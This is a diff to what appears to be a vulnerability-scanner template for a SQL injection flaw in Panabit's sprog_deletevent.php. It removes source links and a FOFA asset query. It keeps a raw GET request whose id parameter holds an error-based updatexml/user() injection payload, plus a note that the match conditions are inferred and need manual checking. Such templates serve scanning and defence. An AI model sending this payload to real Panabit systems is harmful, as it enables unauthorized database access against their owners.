@@ -3,14 +3,8 @@ info:
   name: Panabit sprog_deletevent.php SQL注入
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/qs4bcht64dptsbrl
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: qs4bcht64dptsbrl
-    fofa: app="Panabit-Panalog" app.name="Panabit 日志系统"
 http:
 - raw:
   - 'GET /Maintain/sprog_deletevent.php?openid=1&id=1%20or%20updatexml(1,concat(0x7e,(user())),0)&cloudip=1 HTTP/1.1
